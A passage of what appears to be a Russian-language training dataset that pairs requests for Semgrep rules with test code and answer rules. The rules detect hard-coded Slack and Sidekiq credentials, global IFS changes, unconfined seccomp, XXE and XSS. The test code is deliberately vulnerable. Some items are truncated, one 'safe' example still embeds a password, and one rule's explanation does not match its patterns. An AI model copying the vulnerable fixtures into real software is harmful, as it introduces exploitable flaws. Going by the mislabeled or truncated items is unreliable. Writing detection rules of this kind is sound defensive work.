    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: slack-legacy-workspace-token.txt\n// ruleid: slack-legacy-workspace-token\n\"access_token\": \"xoxa-2-511111111-31111111111-3111111111111-e039d02840a0b9379c\" \n// ruleid: slack-legacy-workspace-token\n\"access_token1\": \"xoxa-6-alsq1cwl5op9 \n// ruleid: slack-legacy-workspace-token\n\"access_token2\": \"xoxa-78xxgd5dv4gi \n// ruleid: slack-legacy-workspace-token\n\"refresh_token1\": \"xoxr-7-4k4mijfc7mno \n// ruleid: slack-legacy-workspace-token\n\"refresh_token2\": \"xoxr-7qkclc4f471a  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: slack-legacy-workspace-token\n\"access_token\": \"xoxa-2-511111111-31111111111-3111111111111-e039d02840a0b9379c\" \n• // ruleid: slack-legacy-workspace-token\n\"access_token1\": \"xoxa-6-alsq1cwl5op9 \"\n• // ruleid: slack-legacy-workspace-token\n\"access_token2\": \"xoxa-78xxgd5dv4gi \"\n\nБезопасные паттерны:  \n• var accessToken = getFromSecureVault('slack_access_token');\n• const refreshToken = process.env.SLACK_REFRESH_TOKEN\n• let token = fetchTokenFromEnvironmentVariable('SLACK_ACCESS_TOKEN')\n\nЛегенда аннотаций:\n- // ruleid:slack-legacy-workspace-token: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:slack-legacy-workspace-token: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: slack-legacy-workspace-token\n  message: A gitleaks slack-legacy-workspace-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (xox[ar]-(?:\\d-)?[0-9a-zA-Z]{8,48})\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных токенов Slack legacy workspace в исходном коде. Паттерн ищет строки, начинающиеся с 'xox[a,r]-', за которыми следуют от 8 до 48 буквенно-цифровых символов. Примеры опасного кода содержат явно указанные токены доступа и обновления, которые не должны храниться в исходном коде. Безопасный код избегает жесткого кодирования таких токенов.\n\n# Ключевые элементы:\n- ID: slack-legacy-workspace-token\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "slack-legacy-workspace-token",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: ifs-tampering\nОписание уязвимости: The special variable IFS affects how splitting takes place when expanding unquoted variables. Don't set it globally. Prefer a dedicated utility such as 'cut' or 'awk' if you need to split input data. If you must use 'read', set IFS locally using e.g. 'IFS=\",\" read -a my_array'.\nCWE: CWE-20: Improper Input Validation\nТип анализа: search\nЯзык: bash",
    "input": "Требования:\n- Язык: bash\n- Тип анализа: search\n- CWE: CWE-20: Improper Input Validation\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: ifs-tampering.bash\n# ruleid: ifs-tampering\nIFS=,\n\n# ok: ifs-tampering\nIFS=, read -a values  # Ограничиваем длину\n\nОпасные паттерны:\n• IFS=,\nread -a array\n• IFS=$'\t\n' read -a lines\n\nБезопасные паттерны:  \n• IFS=, read -a values\n• IFS=$'\t\n' read -a words\n\nЛегенда аннотаций:\n- // ruleid:ifs-tampering: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ifs-tampering: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ifs-tampering\n  languages: [bash]\n  severity: WARNING\n  message: >-\n    The special variable IFS affects how splitting takes place when\n    expanding unquoted variables. Don't set it globally.\n    Prefer a dedicated utility such as 'cut' or 'awk' if you need to split\n    input data. If you must use 'read', set IFS locally using e.g.\n    'IFS=\",\" read -a my_array'.\n  pattern: IFS=...\n  metadata:\n    cwe:\n    - 'CWE-20: Improper Input Validation'\n    category: security\n    technology:\n    - bash\n    confidence: LOW\n    owasp:\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска глобального изменения переменной окружения IFS, которая влияет на разбиение строк при расширении необработанных переменных. Правило ищет присваивание значения переменной IFS с использованием шаблона 'IFS=...', что указывает на потенциальную проблему безопасности, так как изменение глобальной переменной может привести к непреднамеренному поведению при обработке ввода пользователя.\n\n# Ключевые элементы:\n- ID: ifs-tampering\n- Язык: bash \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "ifs-tampering",
      "language": "bash",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: seccomp-confinement-disabled\nОписание уязвимости: Service '$SERVICE' is explicitly disabling seccomp confinement. This runs the service in an unrestricted state. Remove 'seccomp:unconfined' to prevent this.\nCWE: CWE-284: Improper Access Control\nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: CWE-284: Improper Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: seccomp-confinement-disabled.test.yaml\nversion: \"3.9\"\nservices:\n  # ok: seccomp-confinement-disabled\n  web:\n    image: nginx:alpine\n  # ok: seccomp-confinement-disabled\n  worker:\n    image: my-worker-image:latest\n    security_opt:\n      - label:user:testuser\n  # ruleid: seccomp-confinement-disabled\n  db:\n    image: mysql\n    security_opt:\n      - seccomp:unconfined  # Ограничиваем длину\n\nОпасные паттерны:\n• services:\n  db:\n    image: mysql\n    security_opt:\n      - seccomp:unconfined\n• services:\n  db:\n    image: postgres\n    security_opt:\n      - seccomp:unconfined\n    ports:\n      - 5432/tcp\n• services:\n  redis:\n    image: redis:alpine\n    security_opt:\n      - seccomp:unconfined\n\nБезопасные паттерны:  \n• services:\n  db:\n    image: mysql\n    security_opt:\n      - label:user:testuser\n• services:\n  cache:\n    image: memcached\n    security_opt:\n      - seccomp:strict\n• services:\n  app:\n    image: python-app:latest\n    security_opt:\n      - no-new-privs:true\n\nЛегенда аннотаций:\n- // ruleid:seccomp-confinement-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:seccomp-confinement-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: seccomp-confinement-disabled\n  patterns:\n  - pattern-inside: |\n      version: ...\n      ...\n      services:\n        ...\n  - pattern: |\n      $SERVICE:\n        ...\n        image: ...\n        ...\n        security_opt:\n          - ...\n          - seccomp:unconfined\n  message: >-\n    Service '$SERVICE' is explicitly disabling seccomp confinement. This runs\n    the service in an unrestricted state. Remove 'seccomp:unconfined' to prevent this.\n  metadata:\n    cwe:\n    - 'CWE-284: Improper Access Control'\n    references:\n    - https://docs.docker.com/engine/security/seccomp/\n    category: security\n    technology:\n    - docker-compose\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: HIGH\n    confidence: LOW\n  languages: [yaml]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска YAML-файлов, содержащих секцию 'services', внутри которой есть сервис с параметром 'security_opt' и подпараметром 'seccomp:unconfined'. Правило использует шаблон, который сначала ищет общий контекст версии и сервисов, а затем специфичный паттерн для обнаружения конкретного значения 'seccomp:unconfined' в списке параметров безопасности.\n\n# Ключевые элементы:\n- ID: seccomp-confinement-disabled\n- Язык: yaml \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "seccomp-confinement-disabled",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: unnecessary-checked-arithmetic-in-loop\nОписание уязвимости: A lot of times there is no risk that the loop counter can overflow.  Using Solidity's unchecked block saves the overflow checks.\nCWE: \nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: unnecessary-checked-arithmetic-in-loop.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.2;\n\ncontract TestRequiere {\n    function test(uint256 a) public {\n        uint len = supportedTokens.length;\n        // ruleid: unnecessary-checked-arithmetic-in-loop\n        for (uint i; i < len; i++) {\n            uint256 variable;\n            // ok: unnecessary-checked-arithmetic-in-loop\n            count++;\n        }\n    }\n\n    function test2(uint256 a) public {\n        uint len = supportedTokens.length;\n        // ruleid: unnecessary-checked-arithmetic-in-loop\n        for (uint i = 0; i < len; i++) {\n            // ...\n            uint256 variable;\n        }\n    }\n\n    function test3(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i; i < len;) {\n            // ruleid: unnecessary-checked-arithmetic-in-loop\n            i++;\n            uint256 pp = 10;\n        }\n    }\n\n    function test4(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i = 0; i < len;) {\n            // ruleid: unnecessary-checked-arithmetic-in-loop\n            ++i;\n            uint256 pp = 10;\n        }\n    }\n\n    function test5(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i = 0; i < len;) {\n            // ok: unnecessary-checked-arithmetic-in-loop\n            unchecked {\n                ++i;\n            }\n            uint256 pp = 10;\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• for (uint i; i < len; i++) { ... }\n• for (uint i = 0; i < len; i++) { ... }\n• for (uint i; i < len;) { i++; ... }\n\nБезопасные паттерны:  \n• for (uint i; i < len;) { ... }\n• for (uint i = 0; i < len;) { ... }\n• unchecked { ... i++; ... }\n\nЛегенда аннотаций:\n- // ruleid:unnecessary-checked-arithmetic-in-loop: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unnecessary-checked-arithmetic-in-loop: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n    - id: unnecessary-checked-arithmetic-in-loop\n      message: >-\n        A lot of times there is no risk that the loop counter can overflow. \n        Using Solidity's unchecked block saves the overflow checks.\n      metadata:\n        references:\n          - https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g011---unnecessary-checked-arithmetic-in-for-loop\n        category: performance\n        technology:\n          - solidity\n      patterns:\n      - pattern-either:\n          - pattern-inside: |\n              for ($TYPE $VAR = ... ; ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR = ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR; ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR; ...) {\n                ...\n              }\n      - pattern-either:\n          - pattern: |\n              $VAR++\n          - pattern: |\n              ++$VAR\n      - pattern-not-inside: |\n          unchecked {\n            ...\n            <... $VAR ...>;\n            ...\n          }\n      languages:\n        - solidity\n      severity: INFO\n  \n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска циклов for в Solidity, где отсутствует необходимость проверять переполнение счетчика цикла. Правило использует шаблон, который ищет конструкции for с различными форматами инициализации и итерации, а затем проверяет наличие инкремента переменной внутри тела цикла. Дополнительно исключаются случаи использования блока unchecked вокруг инкрементации переменной.\n\n# Ключевые элементы:\n- ID: unnecessary-checked-arithmetic-in-loop\n- Язык: solidity \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "unnecessary-checked-arithmetic-in-loop",
      "language": "solidity",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения sidekiq-sensitive-url\nОписание уязвимости: A gitleaks sidekiq-sensitive-url was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: sidekiq-sensitive-url.go\n// ruleid: sidekiq-sensitive-url\nhttps://cafebabe:deadbeef@gems.contribsys.com/  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: sidekiq-sensitive-url\nhttps://cafebabe:deadbeef@gems.contribsys.com\n• // ruleid: sidekiq-sensitive-url\nhttp://ff4f4f4f:ff4f4f4f@enterprise.contribsys.com/api/v1\n• // ruleid: sidekiq-sensitive-url\nhttps://12345678:87654321@somecontribsysdomain.com\n\nБезопасные паттерны:  \n• // safe: no sensitive url\nhttps://example.com/login\n• // safe: using environment variable\nhttps://$USERNAME:$PASSWORD@gems.contribsys.com\n• // safe: obfuscated password\nhttps://user:verysecret@company.com\n\nЛегенда аннотаций:\n- // ruleid:sidekiq-sensitive-url: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:sidekiq-sensitive-url: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: sidekiq-sensitive-url\n  message: A gitleaks sidekiq-sensitive-url was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)\\b(http(?:s??):\\/\\/)([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)(?:[\\/|\\#|\\?|:]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированных URL-адресов, содержащих учетные данные в формате 'username:password' перед доменами gems.contribsys.com или enterprise.contribsys.com. Паттерн настроен так, чтобы игнорировать регистр ('(?i)') и находить только те URL, которые явно содержат шестнадцатеричные символы длиной 8, разделенные двоеточием (:), представляющие собой возможные пароли и имена пользователей. Правило предназначено для выявления жесткого кодирования учетных данных, что является небезопасной практикой, поскольку такие секреты могут быть раскрыты и использованы злоумышленниками.\n\n# Ключевые элементы:\n- ID: sidekiq-sensitive-url\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "sidekiq-sensitive-url",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: named-credentials-constant-match\nОписание уязвимости: Named Credentials (and callout endpoints) should be used instead of hard-coding credentials. 1. Hard-coded credentials are hard to maintain when mixed in with application code. 2. It is particularly hard to update hard-coded credentials when they are used amongst different classes. 3. Granting a developer access to the codebase means granting knowledge of credentials, and thus keeping a two-level access is not possible. 4. Using different credentials for different environments is troublesome and error-prone.\nCWE: CWE-540: Inclusion of Sensitive Information in Source Code\nТип анализа: taint\nЯзык: apex\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: apex\n- Тип анализа: taint\n- CWE: CWE-540: Inclusion of Sensitive Information in Source Code\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: NamedCredentialsConstantMatch.cls\n/*\n * Test controller with hard-coded credentials in header\n */\npublic with sharing class NamedCredentialsConstantMatch {\n\n\tpublic void calloutWithHardcodedCredentials() {\n\t\tHttpRequest req = new HttpRequest();\n\n\t\tBlob headerValue = Blob.valueOf('someUsername:somePasswod');\n\t\tString authorizationHeader = 'BASIC ' + EncodingUtil.base64Encode(headerValue);\n\t\t// ruleid: named-credentials-constant-match\n\t\treq.setHeader(AUTHORIZATION_HEADER, authorizationHeader);\n\t\treq.setEndpoint('https://www.website.com');\n\n\t\tHTTPResponse res = new Http().send(req);\n\t}\n\n\tpublic void calloutWithNamedCredential() {\n\t\tHttpRequest req = new HttpRequest();\n\n\t\t// ok: named-credentials-constant-match\n\t\treq.setEndpoint('callout:My_Named_Credential/some_path');\n\n\t\tHTTPResponse res = new Http().send(req);\n\t}\n\n\tpublic static final String AUTHORIZATION_HEADER = 'Authorization';\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• Blob headerValue = Blob.valueOf('someUsername:somePasswod');\n• String authorizationHeader = 'Basic ' + EncodingUtil.base64Encode(headerValue);\n• req.setHeader(AUTHORIZATION_HEADER, authorizationHeader);\n\nБезопасные паттерны:  \n• req.setEndpoint('callout:My_Named_Credential/some_path');\n\nЛегенда аннотаций:\n- // ruleid:named-credentials-constant-match: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:named-credentials-constant-match: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: named-credentials-constant-match\n    min-version: 1.44.0\n    mode: taint\n    severity: ERROR\n    languages:\n      - apex\n    metadata:\n      cwe:\n      - 'CWE-540: Inclusion of Sensitive Information in Source Code'\n      impact: HIGH\n      likelihood: LOW\n      confidence: HIGH\n      category: security\n      subcategory:\n      - vuln\n      technology:\n      - salesforce\n      references:\n      - https://cwe.mitre.org/data/definitions/540.html\n    message: >-\n      Named Credentials (and callout endpoints) should be used instead of hard-coding credentials.\n      1. Hard-coded credentials are hard to maintain when mixed in with application code.\n      2. It is particularly hard to update hard-coded credentials when they are used amongst different classes.\n      3. Granting a developer access to the codebase means granting knowledge of credentials, and thus keeping a two-level access is not possible.\n      4. Using different credentials for different environments is troublesome and error-prone.\n    pattern-sources:\n      - pattern: ...String $X = 'Authorization';\n    pattern-sinks:\n      - patterns:\n        - pattern: req.setHeader($X, ...);\n        - focus-metavariable: $X\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска жесткого кодирования учетных данных авторизации в заголовках HTTP-запросов. Источником потенциальной проблемы является объявление переменной типа String, инициализированной жестко закодированной строкой, содержащей имя пользователя и пароль. Синкой являются методы setHeader класса HttpRequest, которые принимают имя заголовка и значение этого заголовка. Правило использует шаблон источников для поиска объявления переменных, содержащих жестко закодированные учетные данные, и шаблон синков для проверки использования этих переменных при установке заголовков.\n\n# Ключевые элементы:\n- ID: named-credentials-constant-match\n- Язык: apex \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "named-credentials-constant-match",
      "language": "apex",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения xmlreadersettings-unsafe-parser-override\nОписание уязвимости: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity (XXE) injection if supplied with user-controllable data.\nCWE: CWE-611: Improper Restriction of XML External Entity Reference\nТип анализа: taint\nЯзык: csharp\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: taint\n- CWE: CWE-611: Improper Restriction of XML External Entity Reference\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: xmlreadersettings-unsafe-parser-override.cs\npublic void ParseBad(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic static void StaticParseBad(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic void ParseBad2(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(input,rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic void ParseBad3(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    using(var reader = new StringReader(input)){\n        // ruleid:xmlreadersettings-unsafe-parser-override\n        XmlReader myReader = XmlReader.Create(reader,rs);\n                \n        while (myReader.Read())\n        {\n            Console.WriteLine(myReader.Value);\n        }\n        Console.ReadLine();\n    }\n}\n\npublic void ParseGood(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Ignore;\n\n    // ok: xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n            \n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n      # Ограничиваем длину\n\nОпасные паттерны:\n• XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n• XmlReader myReader = XmlReader.Create(input,rs);\n• using(var reader = new StringReader(input)){... XmlReader myReader = XmlReader.Create(reader,rs);...}\n\nБезопасные паттерны:  \n• XmlReader myReader = XmlReader.Create(new StringReader(notInput),rs);\n• XmlReader myReader = XmlReader.Create(reader);\n• var notInput = someSafeLoad();... XmlReader myReader = XmlReader.Create(new StringReader(notInput),rs);\n\nЛегенда аннотаций:\n- // ruleid:xmlreadersettings-unsafe-parser-override: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:xmlreadersettings-unsafe-parser-override: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: xmlreadersettings-unsafe-parser-override\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - focus-metavariable: $ARG\n    - pattern-inside: |\n        public $T $M(...,string $ARG,...){...}\n  pattern-sinks:\n  - patterns:\n    - pattern: |\n        XmlReader $READER = XmlReader.Create(...,$RS,...);\n    - pattern-inside: |\n        XmlReaderSettings $RS = new XmlReaderSettings();\n        ...\n        $RS.DtdProcessing = DtdProcessing.Parse;\n        ...        \n  message: XmlReaderSettings found with DtdProcessing.Parse on an XmlReader handling a string argument\n    from a public method. Enabling Document Type Definition (DTD) parsing may cause XML External Entity\n    (XXE) injection if supplied with user-controllable data.\n  languages:\n  - csharp\n  severity: WARNING\n  metadata:\n    category: security\n    references:\n    - https://www.jardinesoftware.net/2016/05/26/xxe-and-net/\n    - https://docs.microsoft.com/en-us/dotnet/api/system.xml.xmldocument.xmlresolver?view=net-6.0#remarks\n    technology:\n    - .net\n    - xml\n    cwe:\n    - 'CWE-611: Improper Restriction of XML External Entity Reference'\n    owasp:\n    - A04:2017 - XML External Entities (XXE)\n    - A05:2021 - Security Misconfiguration\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    impact: MEDIUM\n    likelihood: LOW\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования XmlReaderSettings с параметром DtdProcessing.Parse в методах, принимающих строковые аргументы от публичных методов. Это может привести к XXE-уязвимости при обработке пользовательских данных. Анализ выполняется путем отслеживания источников (строковых аргументов публичных методов) и сопоставления их с местом создания XmlReader, где используется XmlReaderSettings с включенным DtdProcessing.Parse.\n\n# Ключевые элементы:\n- ID: xmlreadersettings-unsafe-parser-override\n- Язык: csharp \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "xmlreadersettings-unsafe-parser-override",
      "language": "csharp",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения tainted-html-response\nОписание уязвимости: Detected user input flowing into an HTML response. You may be accidentally bypassing secure methods of rendering HTML by manually constructing HTML and this could create a cross-site scripting vulnerability, which could let attackers steal sensitive user data.\nCWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: tainted-html-response.py\ndef lambda_handler(event, context):\n\thtml = f\"<div>{event['input']}</div>\"\n\n\tfoo = {\n\t\t# ok: tainted-html-response\n\t\t\"data\": event['foo']\n\t}\n\tbar(foo)\n\n\tresult = {\n\t\t\"statusCode\": 200,\n\t\t# ruleid: tainted-html-response\n\t\t\"body\": html,\n\t\t\"headers\": {\n\t\t\t\"Content-Type\": \"text/html\"\n\t\t}\n\t}\n\treturn result  # Ограничиваем длину\n\nОпасные паттерны:\n• html = f\\\n\nБезопасные паттерны:  \n• foo = {\\\n\nЛегенда аннотаций:\n- // ruleid:tainted-html-response: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-html-response: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-html-response\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern: event\n    - pattern-inside: |\n        def $HANDLER(event, context):\n          ...\n  pattern-sinks:\n  - patterns:\n    - pattern: $BODY\n    - pattern-inside: |\n        {..., \"headers\": {..., \"Content-Type\": \"text/html\", ...}, \"body\": $BODY, ... }\n  message: >-\n    Detected user input flowing into an HTML response. You may be\n    accidentally bypassing secure methods\n    of rendering HTML by manually constructing HTML and this could create a cross-site\n    scripting vulnerability, which could let attackers steal sensitive user data.\n  metadata:\n    cwe:\n    - \"CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\"\n    owasp:\n    - A07:2017 - Cross-Site Scripting (XSS)\n    - A03:2021 - Injection\n    category: security\n    technology:\n    - aws-lambda\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - python\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования untrusted user input ($EVENT['INPUT']) непосредственно в HTML-ответе ($HTML), что может привести к XSS-уязвимостям. Источником (source) является переменная 'event[\n\n# Ключевые элементы:\n- ID: tainted-html-response\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "tainted-html-response",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения react-legacy-component\nОписание уязвимости: Legacy component lifecycle was detected - $METHOD.\nCWE: \nТип анализа: search\nЯзык: typescript",
    "input": "Требования:\n- Язык: typescript\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: react-legacy-component.jsx\nclass Test1 extends React.Component {\n  state = {\n    value: ''\n  };\n// ruleid: react-legacy-component\n  componentWillReceiveProps(nextProps) {\n    this.setState({ value: nextProps.value });\n  }\n  handleChange = (e) => {\n    this.setState({ value: e.target.value });\n  };\n  render() {\n    return (\n      <input\n        value={this.state.value}\n        onChange={this.handleChange}\n      />\n    );\n  }\n}\n\nclass OkComponent1 extends Component {\n// ok: react-legacy-component\n  componentDidMount() {\n    this.node.scrollIntoView();\n  }\n\n  render() {\n    return <div ref={node => this.node = node} />\n  }\n}\n\n\n// File: react-legacy-component.tsx\nclass Test1 extends React.Component {\n  state = {\n    value: ''\n  };\n// ruleid: react-legacy-component\n  componentWillReceiveProps(nextProps) {\n    this.setState({ value: nextProps.value });\n  }\n  handleChange = (e) => {\n    this.setState({ value: e.target.value });\n  };\n  render() {\n    return (\n      <input\n        value={this.state.value}\n        onChange={this.handleChange}\n      />\n    );\n  }\n}\n\nclass OkComponent1 extends Component {\n// ok: react-legacy-component\n  componentDidMount() {\n    this.node.scrollIntoView();\n  }\n\n  render() {\n    return <div ref={node => this.node = node} />\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• class Test1 extends React.Component {\n  state = {\n    value: ''\n  };\n// ruleid: react-legacy-component\n  componentWillReceiveProps(nextProps) {\n    this.setState({ value: nextProps.value });\n  }\n  han\n• class Test1 